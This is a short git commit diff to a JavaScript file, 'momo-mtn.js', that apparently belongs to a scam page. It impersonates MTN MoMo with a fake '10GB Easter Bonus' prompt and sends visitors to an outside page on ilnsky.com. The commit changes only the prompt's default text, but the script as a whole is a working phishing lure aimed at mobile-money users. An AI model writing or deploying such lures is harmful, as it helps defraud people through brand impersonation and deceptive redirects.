07477d6a966006a08a48ebbf8e642285b97c5ff3
ukpeha55-stack <ukpeha55@gmail.com>
2026-04-01 05:42:53 +0100

    Update momo-mtn.js

--- momo-mtn.js
+++ momo-mtn.js
@@ -1,5 +1,5 @@
 var password = 'ACTIVATE 10GB'
-password=prompt('MoMo: Yello, Your 10GB Easter Bonus is PENDING... Click Ok to Activate Now','ACTIVATE10GB');
+password=prompt('MoMo: Yello, Your 10GB Easter Bonus is PENDING... Click Ok to Activate Now','ACTIVATE 10GB');
 if (password != 'ACTIVATE 10GB') {
 location.href='https://ilnsky.com/momo-bonus.html';
 }
